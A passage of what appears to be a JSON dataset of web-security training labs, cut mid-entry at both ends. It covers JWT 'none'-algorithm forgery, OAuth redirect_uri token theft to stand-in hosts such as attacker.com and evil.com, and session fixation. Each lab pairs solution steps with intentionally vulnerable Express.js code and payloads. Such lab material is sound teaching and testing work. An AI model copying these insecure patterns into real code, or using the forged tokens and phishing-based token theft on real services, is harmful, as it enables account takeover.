      "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'carlos', password: 'pass123' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid'); const token = jwt.sign({ username }, 'insecure-secret'); res.json({ token }); }); app.get('/my-account', (req, res) => { const authHeader = req.headers.authorization; if (!authHeader) return res.status(403).send('Missing token'); const token = authHeader.split(' ')[1]; try { const payload = jwt.verify(token, 'insecure-secret', { algorithms: ['HS256', 'none'] }); res.send(`Welcome ${payload.username}`); } catch (e) { res.status(403).send('Invalid token'); } }); app.listen(4000);",
      "payloads": [
        "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
        "Authorization: Bearer <base64_header>.<base64_payload>.",
        "curl -H 'Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.' http://localhost:4000/my-account"
      ]
    },
    {
      "Lab scenario": "OAuth redirection URI manipulation in third-party login",
      "Lab Description": "The app implements OAuth login using a third-party provider but insecurely accepts dynamic redirect_uris. An attacker can manipulate this URI to intercept the authorization code. To solve: capture Carlos’s OAuth code and use it to log in as Carlos.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "1.Use Burp Suite to initiate OAuth login and intercept the redirect_uri parameter sent to the provider.",
        "2.Modify the redirect_uri to point to an attacker-controlled domain like https://attacker.com/oauth/callback.",
        "3.Send Carlos a phishing link containing the modified redirect_uri, prompting him to log in with the provider.",
        "4.On your server (attacker.com), capture the incoming GET request with ?code= parameter.",
        "5.Exchange the stolen code manually with Postman for an access token, then call /oauth/callback with the valid token to log in as Carlos."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const axios = require('axios'); const app = express(); const CLIENT_ID = 'client123'; const CLIENT_SECRET = 'secret456'; app.get('/login-oauth', (req, res) => { const redirect = req.query.redirect || 'http://localhost:4000/oauth/callback'; const url = `https://auth-provider.com/auth?client_id=${CLIENT_ID}&redirect_uri=${redirect}&response_type=code`; res.redirect(url); }); app.get('/oauth/callback', async (req, res) => { const { code } = req.query; try { const tokenResp = await axios.post('https://auth-provider.com/token', { code, client_id: CLIENT_ID, client_secret: CLIENT_SECRET }); const userInfo = await axios.get('https://auth-provider.com/userinfo', { headers: { Authorization: `Bearer ${tokenResp.data.access_token}` } }); res.send(`Logged in as ${userInfo.data.username}`); } catch { res.status(401).send('OAuth failed'); } }); app.listen(4000);",
      "payloads": [
        "https://auth-provider.com/auth?client_id=client123&redirect_uri=https://attacker.com/oauth/callback&response_type=code",
        "Captured GET /oauth/callback?code=abcd1234",
        "POST https://auth-provider.com/token with code=abcd1234"
      ]
    },
    {
      "Lab scenario": "Session fixation vulnerability in login endpoint",
      "Lab Description": "The application uses session cookies for authentication, but it does not rotate the session ID after login. This enables a session fixation attack where a user is tricked into logging in with a pre-set session ID. To solve: Hijack Carlos's session and access his My Account page using session fixation.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Intercept the GET /login request with Burp Suite and observe the Set-Cookie header assigning a session ID.",
        "Forward the request and monitor session usage pre- and post-login. Notice session ID does not change.",
        "Use OWASP ZAP to pre-set a session ID manually and share that crafted login link with the victim (Carlos).",
        "Simulate Carlos's login using the shared session ID and capture requests in Burp Proxy.",
        "Reuse the same session ID from your own browser to access /my-account as Carlos."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const session = require('express-session'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: false })); app.use(session({ secret: 'fixation-secret', resave: true, saveUninitialized: true })); const users = [{ username: 'carlos', password: '1234' }]; app.get('/login', (req, res) => { res.send('<form method=\"POST\"><input name=\"username\"/><input name=\"password\"/><button>Login</button></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { req.session.user = user.username; return res.redirect('/my-account'); } res.status(403).send('Invalid credentials'); }); app.get('/my-account', (req, res) => { if (req.session.user === 'carlos') return res.send('Account details for carlos'); res.status(403).send('Forbidden'); }); app.listen(4000, () => console.log('Session Fixation Lab running...'));",
      "payloads": [
        "http://vulnerable-site.com/login;jsessionid=FIXED1234",
        "Cookie: connect.sid=FIXED1234",
        "session=preloaded-session; path=/; HttpOnly"
      ]
    },
    {
      "Lab scenario": "JWT tampering via none algorithm vulnerability in API authentication",
      "Lab Description": "This app uses JSON Web Tokens for authentication. However, it does not validate the algorithm properly and allows `alg: none`, making it possible to forge a token without signing it. To solve: Tamper with a JWT to impersonate Carlos and access his data.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Capture a valid JWT after logging in using Postman or Burp.",
        "Use jwt.io or a local script to decode the JWT and change the payload to {\"username\":\"carlos\"}.",
        "Set alg to \"none\" in the header and remove the signature part of the JWT.",
        "Use OWASP ZAP to send a forged token in the Authorization: Bearer header.",
        "Access the /api/user/profile endpoint and verify the response contains Carlos's info."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'carlos', password: '1234' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid credentials'); const token = jwt.sign({ username: user.username }, 'secret', { algorithm: 'HS256' }); res.json({ token }); }); app.get('/api/user/profile', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const payload = jwt.decode(token); if (payload?.username === 'carlos') return res.send('Sensitive data of carlos'); res.status(403).send('Access denied'); }); app.listen(4000, () => console.log('JWT None Algorithm Lab running...'));",
      "payloads": [
        "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
        "{\"alg\":\"none\"}.{\"username\":\"carlos\"}.",
        "Authorization: Bearer <unsigned JWT with alg: none>"
      ]
    },
    {
      "Lab scenario": "OAuth open redirect flaw in callback handler",
      "Lab Description": "The app integrates OAuth for third-party login but fails to validate redirect URIs properly. This allows an attacker to steal the authorization code by injecting an open redirect in the callback flow. To solve: Steal Carlos's OAuth code and access his profile.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Set up a malicious redirect URI on your domain that logs the query parameters.",
        "Craft a link using the app's OAuth endpoint with redirect_uri=https://attacker.com/oauth-catch",
        "Use social engineering to make Carlos click the malicious login link.",
        "Capture the authorization code from your server logs and exchange it at /oauth/token using Postman.",
        "Use the obtained token to call /profile and access Carlos's data."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const axios = require('axios'); const app = express(); app.get('/login-oauth', (req, res) => { const redirectURI = req.query.redirect_uri;  res.redirect(`https://authprovider.com/oauth?client_id=xyz&redirect_uri=${redirectURI}`); }); app.get('/oauth/callback', (req, res) => { const code = req.query.code; axios.post('https://authprovider.com/oauth/token', { code }).then(response => { const accessToken = response.data.access_token; res.redirect(`/profile?token=${accessToken}`); }); }); app.get('/profile', (req, res) => { const token = req.query.token; if (token === 'carlos-token') return res.send('Carlos's profile data'); res.status(403).send('Access denied'); }); app.listen(4000, () => console.log('OAuth Open Redirect Lab running...'));",
      "payloads": [
        "https://vulnerable-app.com/login-oauth?redirect_uri=https://attacker.com/log-code",
        "GET https://authprovider.com/oauth/token?code=stolen-code",
        "https://vulnerable-app.com/profile?token=carlos-token"
      ]
    },
    {
      "Lab scenario": "OAuth session fixation in authorization code flow",
      "Lab Description": "The application implements OAuth using the authorization code flow but fails to rotate the session identifier after login. The authorization server is hosted separately, but session tokens are not refreshed upon login. An attacker can craft a session, fix it for the victim, and then hijack their session post-login. To solve: hijack Carlos's authenticated session using a fixation technique.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "1. Use Burp Suite to intercept your own OAuth login flow and capture the session cookie before login.",
        "2. Share the captured session cookie with the victim by embedding it in a phishing link (e.g., https://target-app.com/oauth/start?session=abc123).",
        "3. Log out and open the phishing link in another browser (simulating the victim) and complete OAuth login as Carlos.",
        "4. Observe that Carlos is authenticated using the attacker’s session (session token reused).",
        "5. Return to the attacker browser and access /my-account using the fixed session to verify successful session hijack."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const session = require('express-session'); const app = express(); app.use(session({ secret: 'weakSecret', resave: false, saveUninitialized: true })); app.get('/oauth/callback', (req, res) => { const { code } = req.query; const user = exchangeCodeForUser(code); if (user) { req.session.user = user; res.redirect('/my-account'); } }); function exchangeCodeForUser(code) { if (code === 'valid-code') return 'carlos'; return null; } app.get('/my-account', (req, res) => { if (req.session.user) res.send(`Welcome, ${req.session.user}`); else res.status(401).send('Unauthorized'); }); app.listen(4000, () => console.log('OAuth Fixation Lab running'));",
      "payloads": [
        "https://target-app.com/oauth/start?session=abc123",
        "OAuth callback with valid code using fixed session: /oauth/callback?code=valid-code"
      ]
    },
    {
      "Lab scenario": "JWT tampering using alg: none",
      "Lab Description": "This application uses JWTs for user authentication but fails to enforce strong algorithm verification. The server trusts JWTs that use 'none' as their algorithm and doesn't validate the signature. To solve: forge a token granting access to Carlos’s account by tampering with the algorithm field.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "1. Log in using your own credentials and capture the JWT using Postman or Burp.",
        "2. Decode the JWT using jwt.io or a local tool. Note the alg header and payload values.",
        "3. Modify the JWT header to: {\"alg\": \"none\"} and set the payload to: {\"username\": \"carlos\"}.",
        "4. Remove the signature section and reconstruct the JWT: base64(header).base64(payload).",
        "5. Use Burp Repeater to send a request with the forged JWT in the Authorization header and access /my-account."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const jwt = require('jsonwebtoken'); const express = require('express'); const app = express(); app.use((req, res, next) => { const token = req.headers['authorization']?.split(' ')[1]; if (token) { const decoded = jwt.decode(token, { complete: true }); if (decoded?.header?.alg === 'none') { req.user = decoded.payload; next(); return; } jwt.verify(token, 'supersecret', (err, user) => { if (!err) req.user = user; next(); }); } else { next(); } }); app.get('/my-account', (req, res) => { if (req.user?.username) res.send(`Welcome ${req.user.username}`); else res.status(401).send('Unauthorized'); }); app.listen(4000, () => console.log('JWT None Algorithm Lab running'));",
      "payloads": [
        "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
        "Authorization: Bearer [FORGED_JWT_WITH_NONE]"
      ]
    },
    {
      "Lab scenario": "Session ID leakage through verbose error logging",
      "Lab Description": "This application logs full session identifiers in the response body when errors occur. Attackers can trigger errors and collect leaked session tokens from responses. To solve: leak Carlos’s session ID and use it to access his account.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "1. Use OWASP ZAP to spider the site and trigger various invalid requests to observe error messages.",
        "2. Identify a response leaking a full session ID (e.g., 'Error: Invalid action [Session: abc1234carlos]') in the response body.",
        "3. Copy the leaked session value and set it manually in your own session cookie using Burp or browser dev tools.",
        "4. Refresh the browser while authenticated with the hijacked session.",
        "5. Navigate to /my-account to confirm session takeover and solve the lab."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const session = require('express-session'); const app = express(); app.use(session({ secret: 'logSecret', resave: false, saveUninitialized: true })); app.get('/action', (req, res) => { const action = req.query.action; if (!action) { return res.status(500).send(`Error: Invalid action [Session: ${req.sessionID}]`); } res.send('Action received'); }); app.get('/my-account', (req, res) => { if (req.sessionID === 'abc1234carlos') return res.send('Carlos Account Page'); res.status(403).send('Forbidden'); }); app.listen(4000, () => console.log('Verbose Error Session Leak Lab running'));",
      "payloads": [
        "/action",
        "Set-Cookie: connect.sid=abc1234carlos",
        "GET /my-account with forged session"
      ]
    },
    {
      "Lab scenario": "JWT Signature None Algorithm Bypass in Session Token Verification",
      "Lab Description": "This lab demonstrates a vulnerability in JWT session token validation where the application incorrectly accepts tokens using the 'none' algorithm, bypassing signature verification entirely. The application relies on JWT tokens for authentication but fails to enforce a secure algorithm. To solve: Forge a valid token and access Carlos's My Account page without needing his password.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "1. Use Burp Suite to capture a valid login token from your own account and send it to Decoder.",
        "2. Decode the JWT and observe the header contains 'alg':'HS256'.",
        "3. Modify the JWT header to use 'alg':'none' and remove the signature section entirely.",
        "4. Replace the payload with '{\"username\":\"carlos\"}' and re-encode the JWT.",
        "5. Replace your session cookie with the modified JWT and refresh the My Account page to confirm access."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const secret = 'supersecuresecret'; app.use(require('cookie-parser')()); app.get('/login', (req, res) => { const { username } = req.query; const token = jwt.sign({ username }, secret, { algorithm: 'HS256' }); res.cookie('session', token); res.send('Logged in as ' + username); }); app.get('/my-account', (req, res) => { const token = req.cookies.session; const decoded = jwt.decode(token, { complete: true }); if (!decoded) return res.status(401).send('Invalid Token'); res.send('Welcome ' + decoded.payload.username); }); app.listen(4000, () => console.log('JWT None Algorithm Lab running on port 4000'));",
      "payloads": [
        "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
        "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0."
      ]
    },
    {
      "Lab scenario": "OAuth 2.0 Misconfiguration — Open Redirect Token Theft in Authorization Flow",
      "Lab Description": "This lab showcases an OAuth misconfiguration where the authorization server does not properly validate the 'redirect_uri' parameter, allowing open redirection and token theft. The application trusts the user-supplied redirect URL without whitelisting. To solve: Exploit the OAuth flow to capture a valid token from Carlos's account.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "1. Use OWASP ZAP's Spider to map the OAuth authorization flow endpoints.",
        "2. Observe the 'redirect_uri' is not validated and can point to an attacker-controlled domain.",
        "3. Set up a listener on your own domain using Burp Collaborator to intercept tokens.",
        "4. Craft a URL with 'redirect_uri' pointing to your Collaborator link and trick Carlos into clicking it.",
        "5. Capture the token from the Collaborator, replay it in an Authorization header, and access Carlos's My Account page."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const app = express(); app.get('/auth', (req, res) => { const { redirect_uri, token } = req.query; if (!redirect_uri) return res.status(400).send('Missing redirect_uri'); res.redirect(redirect_uri + '?token=' + token); }); app.listen(4000, () => console.log('OAuth Open Redirect Lab running on port 4000'));",
      "payloads": [
        "https://attacker.com/callback?token=ACCESS_TOKEN",
        "https://yourdomain.exploit-server.net/?token=ACCESS_TOKEN"
      ]
    },
    {
      "Lab scenario": "Session Fixation via Predictable Session IDs in Login Process",
      "Lab Description": "This lab highlights a session fixation vulnerability where the application assigns session tokens before authentication and fails to issue new ones post-login. An attacker can force a victim to use a pre-selected session ID. To solve: Predict or fixate Carlos's session ID and gain access to his account.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "1. Use Burp Suite's Proxy to intercept a pre-login session cookie and note the format.",
        "2. Share the session ID with the victim using a phishing link including 'sessionid=knownvalue' as a URL parameter.",
        "3. Wait for Carlos to log in using the pre-assigned session.",
        "4. Reuse the same session cookie in your browser once the victim logs in.",
        "5. Visit the /my-account page and confirm the session now belongs to Carlos."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); app.use((req, res, next) => { if (!req.cookies.sessionid) { const sessionId = 'sess-' + Math.random().toString(36).substring(2); res.cookie('sessionid', sessionId); } next(); }); app.post('/login', (req, res) => { const { username } = req.body; res.send('Logged in as ' + username); }); app.get('/my-account', (req, res) => { res.send('Account page: SessionID=' + req.cookies.sessionid); }); app.listen(4000, () => console.log('Session Fixation Lab running on port 4000'));",
      "payloads": [
        "sess-fixedattackid",
        "sess-victimcontrolid",
        "sess-carlosfixedid"
      ]
    },
    {
      "Lab scenario": "JWT tampering via algorithm confusion in API Authentication",
      "Lab Description": "The API authentication mechanism uses JSON Web Tokens (JWTs) for session management. The server trusts the 'alg' field in the JWT header without validation, which allows algorithm confusion attacks. The application fails to enforce the expected signing algorithm, allowing unsigned tokens. To solve: forge an admin JWT token using 'none' algorithm and access the admin dashboard.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Use Burp Suite to intercept a valid JWT after logging into your own account.",
        "Decode the JWT using jwt.io or Burp Decoder to understand its structure.",
        "Modify the JWT header to {\"alg\":\"none\",\"typ\":\"JWT\"} and remove the signature section.",
        "Replay the modified JWT using Postman in the Authorization header and change the payload sub to 'admin'.",
        "Send the crafted request to /admin/dashboard and confirm access to solve the lab."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const jwt = require('jsonwebtoken'); const express = require('express'); const app = express(); app.get('/admin/dashboard', (req, res) => { const token = req.headers['authorization'].split(' ')[1]; const decoded = jwt.verify(token, 'secret-key', { algorithms: ['HS256', 'none'] }); if (decoded.sub === 'admin') { res.send('Welcome Admin!'); } else { res.status(403).send('Forbidden'); } }); app.listen(4000, () => console.log('JWT Lab running on port 4000'));",
      "payloads": [
        "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9.",
        "eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9."
      ]
    },
    {
      "Lab scenario": "OAuth implicit flow token theft via redirect manipulation",
      "Lab Description": "The web app uses OAuth for authentication, but improperly validates the redirect_uri parameter during the OAuth handshake. An attacker can manipulate this parameter to point to a malicious endpoint and steal access tokens. To solve: intercept an OAuth request and redirect the victim’s token to your controlled server.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Use Burp Suite to intercept the OAuth login initiation and identify the redirect_uri parameter.",
        "Modify redirect_uri to point to your server: https://evil.com/callback.",
        "Host a listener on https://evil.com/callback using a Python HTTP server or Burp Collaborator.",
        "Send the OAuth URL to the victim (e.g. via phishing). Once the victim authenticates, the token will be sent to your server.",
        "Use the stolen token in Postman to access /api/user-profile and confirm the victim’s data is exposed."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const url = require('url'); const app = express(); app.get('/oauth/authorize', (req, res) => { const redirectUri = req.query.redirect_uri; const accessToken = 'abcdef123456'; res.redirect(`${redirectUri}#access_token=${accessToken}`); }); app.listen(4000, () => console.log('OAuth Lab running on port 4000'));",
      "payloads": [
        "https://evil.com/callback#access_token=abcdef123456",
        "https://attacker.com/steal?token=abcdef123456"
      ]
    },
    {
      "Lab scenario": "Session fixation via predictable session ID in login flow",
      "Lab Description": "The application uses predictable session IDs generated before login and does not regenerate them after authentication. An attacker can fix a session ID before the victim logs in, gaining unauthorized access to the victim's session. To solve: pre-assign a session ID, send it to the victim, and hijack the account once the victim authenticates.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "Use OWASP ZAP to intercept the session ID assigned before login (/login page).",
        "Manually set the session ID to a known value using the browser’s DevTools or Burp Cookie Editor.",
        "Send the crafted link with this session ID to the victim, enticing them to log in.",
        "Once the victim logs in, reuse the same session ID in your browser to take over the authenticated session.",
        "Visit /my-account to confirm the session is active as the victim."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); app.get('/login', (req, res) => { const sessionId = req.cookies['session'] || Math.random().toString(36).substring(7); res.cookie('session', sessionId); res.send('Login page - session initialized'); }); app.post('/authenticate', (req, res) => { const sessionId = req.cookies['session']; if (sessionId) res.redirect('/my-account'); else res.status(401).send('Session missing'); }); app.get('/my-account', (req, res) => { res.send('Welcome to your account'); }); app.listen(4000, () => console.log('Session Fixation Lab running on port 4000'));",
      "payloads": [
        "Cookie: session=attackerSession123",
        "Cookie: session=xyzfixedsession"
      ]
    },
    {
      "Lab scenario": "JWT signature validation bypass via 'none' algorithm",
      "Lab Description": "This lab simulates a web application that uses JSON Web Tokens (JWT) for session management but fails to enforce proper algorithm checks during signature verification. The server trusts any JWT token where the algorithm field is modified to 'none'. To solve the lab, forge a valid JWT for user 'carlos' without knowing the secret key and access the protected /my-account endpoint.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "1. Use Burp Suite or Postman to capture the JWT token after logging in as your own user.",
        "2. Decode the JWT using jwt.io or a similar decoder, and observe the 'alg' field set to HS256 and the payload containing your username.",
        "3. Modify the 'alg' field from HS256 to 'none' and change the payload to {\"username\":\"carlos\"}.",
        "4. Re-encode the header and payload without generating a signature and submit this token as the Authorization header in a new request to /my-account.",
        "5. If successful, you will gain access to Carlos's account and the lab will be solved."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const SECRET = 'supersecret'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username }, SECRET, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/my-account', (req, res) => { const authHeader = req.headers['authorization']; if (!authHeader) return res.status(401).send('Unauthorized'); const token = authHeader.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded && decoded.header.alg === 'none') { res.send(`Account details for ${decoded.payload.username}`); } else { jwt.verify(token, SECRET, (err, user) => { if (err) return res.status(403).send('Forbidden'); res.send(`Account details for ${user.username}`); }); } }); app.listen(4000, () => console.log('JWT Lab running on port 4000'));",
      "payloads": [
        "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
        "{\"alg\":\"none\"}.{ \"username\":\"carlos\" }."
      ]
    },
    {
      "Lab scenario": "Session Fixation through predictable session IDs",
      "Lab Description": "This lab's session management mechanism uses predictable session identifiers. The server assigns the session ID before authentication and fails to regenerate it after successful login. To solve the lab, pre-set a known session ID for the victim and log in to their account using the same session ID to hijack their session.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "1. Use Burp Suite to intercept your own login flow and observe the Set-Cookie response with a predictable PHPSESSID value.",
        "2. Manually manipulate the session ID by setting the PHPSESSID to 'fixed-session-1337' before the login attempt.",
        "3. Log out and convince the victim to log in using the crafted link embedding your fixed session ID (e.g., http://target.site/login?PHPSESSID=fixed-session-1337).",
        "4. Once the victim logs in, reuse the same session ID 'fixed-session-1337' to access the /my-account endpoint.",
        "5. Successful access to the account page using the shared session ID confirms the vulnerability."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); app.get('/login', (req, res) => { const sessionId = req.cookies['PHPSESSID'] || Math.random().toString(36).substring(2, 15); res.cookie('PHPSESSID', sessionId); res.send(`<form method='POST'><input name='username'><input name='password' type='password'><button type='submit'>Login</button></form>`); }); app.post('/login', (req, res) => { const sessionId = req.cookies['PHPSESSID']; if (sessionId) { res.send('Login successful! Session ID remains the same.'); } else { res.status(400).send('No session ID'); } }); app.listen(4000, () => console.log('Session Fixation Lab running on port 4000'));",
      "payloads": [
        "PHPSESSID=fixed-session-1337",
        "Set-Cookie: PHPSESSID=fixed-session-1337",
        "http://target.site/login?PHPSESSID=fixed-session-1337"
      ]
    },
    {
      "Lab scenario": "OAuth implicit flow misconfiguration",
      "Lab Description": "This lab's OAuth 2.0 implementation uses the implicit flow without validating the redirect URI properly. Attackers can manipulate the redirect_uri parameter to steal access tokens. To solve the lab, craft a malicious OAuth URL to capture Carlos's token and access his account.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "1. Analyze the OAuth login request using Burp Suite or OWASP ZAP and observe the 'redirect_uri' parameter.",
        "2. Modify the redirect_uri parameter to point to your controlled server (e.g., http://attacker.com/callback) and send the URL to Carlos.",
        "3. Host a simple HTTP listener on your attacker-controlled server to capture incoming requests with tokens in the URL fragment.",
        "4. When Carlos clicks the malicious link and logs in, the token will be sent to your server via the URI fragment.",
        "5. Use the stolen token in an Authorization: Bearer header to access the /my-account endpoint as Carlos."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const app = express(); app.get('/authorize', (req, res) => { const { redirect_uri } = req.query; const token = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.carlos.signature'; res.redirect(`${redirect_uri}#access_token=${token}`); }); app.get('/my-account', (req, res) => { const authHeader = req.headers['authorization']; if (authHeader && authHeader.includes('carlos')) { res.send('Account details for carlos'); } else { res.status(401).send('Unauthorized'); } }); app.listen(4000, () => console.log('OAuth Lab running on port 4000'));",
      "payloads": [
        "http://target.site/authorize?client_id=lab-client&redirect_uri=http://attacker.com/callback&response_type=token",
        "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.carlos.signature"
      ]
    },
    {
      "Lab scenario": "JWT Signature None Algorithm Exploit in Authentication Token Verification",
      "Lab Description": "This lab simulates an application vulnerable to JWT token manipulation due to insecure implementation of the 'none' algorithm during signature verification. The backend fails to enforce token signature validation when 'alg' is set to 'none'. The application issues JWT tokens after successful login, which are used for session authentication. To solve: Forge a JWT token to escalate privileges and access Carlos's account page.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Use Burp Suite to intercept and inspect the JWT after logging into your own account.",
        "Decode the JWT using jwt.io or Burp Decoder to confirm the 'HS256' algorithm is in use.",
        "Modify the token's payload to set 'username':'carlos' and change the algorithm in the header from 'HS256' to 'none'. Remove the signature part.",
        "Send the forged JWT as the Authorization Bearer token using Postman or Burp Repeater.",
        "Access /my-account endpoint and confirm Carlos's account page loads, completing the lab."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst app = express();\napp.use(express.json());\nconst secret = 'supersecret';\napp.post('/login', (req, res) => {\n  const { username } = req.body;\n  const token = jwt.sign({ username }, secret, { algorithm: 'HS256' });\n  res.json({ token });\n});\napp.get('/my-account', (req, res) => {\n  const token = req.headers['authorization'].split(' ')[1];\n  const payload = jwt.decode(token, { complete: true });\n  if (payload.header.alg === 'none') {\n    res.send(`Account details for ${payload.payload.username}`);\n  } else {\n    jwt.verify(token, secret, (err, decoded) => {\n      if (err) return res.status(401).send('Invalid Token');\n      res.send(`Account details for ${decoded.username}`);\n    });\n  }\n});\nconst PORT = 4000;\napp.listen(PORT, () => console.log(`JWT None Algorithm Lab running on http://localhost:${PORT}`));",
      "payloads": [
        "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
        "{\"alg\":\"none\"}.{ \"username\": \"carlos\" }.",
        "Header: {\"alg\":\"none\"}, Payload: {\"username\":\"carlos\"}, Signature: [empty]"
      ]
    },
    {
      "Lab scenario": "OAuth Misconfiguration in Token Validation Flow",
      "Lab Description": "This lab focuses on exploiting an OAuth token misconfiguration where the server only verifies the token's issuer claim (`iss`) and skips validation of the access token signature. The lab involves leveraging this weakness to craft a fake token and impersonate a privileged user. To solve: Forge a signed JWT access token with a manipulated issuer pointing to a trusted domain and access Carlos's profile.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Perform reconnaissance using Burp Suite to capture a valid OAuth token exchange between the client and authorization server.",
        "Use jwt.io to decode the token and observe the 'iss' and 'sub' claims structure.",
        "Create a forged token with the same issuer but modify the 'sub' to 'carlos' using jwt-tool.",
        "Submit the forged token using Postman as an Authorization Bearer token to /my-account.",
        "Verify Carlos's profile loads without server-side token signature validation, confirming successful exploitation."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst app = express();\napp.use(express.json());\napp.get('/my-account', (req, res) => {\n  const token = req.headers['authorization'].split(' ')[1];\n  const payload = jwt.decode(token);\n  if (payload.iss === 'https://auth.example.com') {\n    res.send(`Account details for ${payload.sub}`);\n  } else {\n    res.status(403).send('Invalid Token Issuer');\n  }\n});\nconst PORT = 4000;\napp.listen(PORT, () => console.log(`OAuth Misconfiguration Lab running on http://localhost:${PORT}`));",
      "payloads": [
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJodHRwczovL2F1dGguZXhhbXBsZS5jb20iLCJzdWIiOiJjYXJsb3MifQ.fake_signature",
        "{\"iss\":\"https://auth.example.com\", \"sub\":\"carlos\"}",
        "Custom token signed with any secret — as signature is not verified"
      ]
    },
    {
      "Lab scenario": "Session Fixation in Cookie-Based Authentication",
      "Lab Description": "This lab's authentication mechanism is vulnerable to session fixation. When a user logs in, the session identifier is not regenerated, enabling an attacker to set the session ID ahead of authentication. The application accepts any existing session ID and continues the session post-login. To solve: Pre-set a session ID, trick the victim into using it, log in as Carlos and hijack the session using the same ID.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Use Burp Suite to observe the session cookie assigned before authentication when accessing /login.",
        "Manually craft a link embedding a preset session cookie, e.g., http://target/login with cookie: sessionid=attackersession123.",
        "Use social engineering or simulated behavior to have the victim log in while using the attacker-defined session ID.",
        "Once Carlos logs in, reuse the fixed session ID to access /my-account.",
        "Confirm Carlos's account page loads, completing the exploitation."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express');\nconst cookieParser = require('cookie-parser');\nconst app = express();\napp.use(cookieParser());\nconst users = { 'carlos': 'password123' };\nconst sessions = {};\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  if (users[username] === password) {\n    sessions[req.cookies.sessionid] = username;\n    res.send(`Welcome ${username}`);\n  } else {\n    res.status(401).send('Invalid credentials');\n  }\n});\napp.get('/my-account', (req, res) => {\n  const username = sessions[req.cookies.sessionid];\n  if (username) {\n    res.send(`Account details for ${username}`);\n  } else {\n    res.status(401).send('Not logged in');\n  }\n});\nconst PORT = 4000;\napp.listen(PORT, () => console.log(`Session Fixation Lab running on http://localhost:${PORT}`));",
      "payloads": [
        "Set-Cookie: sessionid=attackersession123",
